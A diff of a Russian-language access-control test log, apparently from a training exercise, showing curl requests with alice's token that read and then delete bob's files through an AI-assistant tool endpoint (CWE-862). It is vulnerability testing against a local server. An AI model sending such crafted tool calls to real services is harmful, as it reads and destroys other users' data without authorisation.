@@ -1,6 +1,15 @@
-=== BEFORE: read bob receipt ===
+=== ОБЯЗАТЕЛЬНЫЙ ТЕСТ КОНТРОЛЯ ДОСТУПА (сервер на :8067 для этого прогона) ===
+Изготовленный вручную JSON решения передан в POST /assistant/execute с токеном alice (X-Token).
+Инструмент delete_tree доступен клиенту; сервер не проверяет роль/владельца/право на инструмент.
+
+=== BEFORE: read_file files/bob/receipt.txt (токен alice) ===
+curl -s -X POST .../assistant/execute -H "X-Token: <alice>" -d '{"decision":{"tool":"read_file","arguments":{"path":"files/bob/receipt.txt"}}}'
 {"content": "TEST_BOB receipt: lamp, 1500 RUB"}
-=== REQUEST: POST /assistant/execute tool=delete_tree files/bob ===
+=== DELETE: delete_tree files/bob (токен alice) ===
+curl -s -X POST .../assistant/execute -H "X-Token: <alice>" -d '{"decision":{"tool":"delete_tree","arguments":{"path":"files/bob"}}}'
 {"deleted": "files/bob"}
-=== AFTER: try read bob receipt again (should 500/gone) ===
-{"error": "[Errno 2] No such file or directory: '/private/var/folders/zt/3y93d34n23x_bpyhdrmt8r5c0000gn/T/itmo-practice-06-4u_4sk72/files/bob/receipt.txt'", "type": "FileNotFoundError"}
+=== AFTER: read_file files/bob/receipt.txt (чек уничтожен) ===
+{"error": "[Errno 2] No such file or directory: '/private/var/folders/zt/3y93d34n23x_bpyhdrmt8r5c0000gn/T/itmo-practice-06-j83e74xj/files/bob/receipt.txt'", "type": "FileNotFoundError"}
+ВЫВОД: сервер исполнил опасное решение delete_tree от обычного клиента alice без проверки
+права на инструмент/владельца. Чек bob уничтожен. Восстанавливается перезапуском сервиса.
+Это уязвимость контроля доступа (CWE-862), не зависящая от послушания LLM — service.py:99-109.
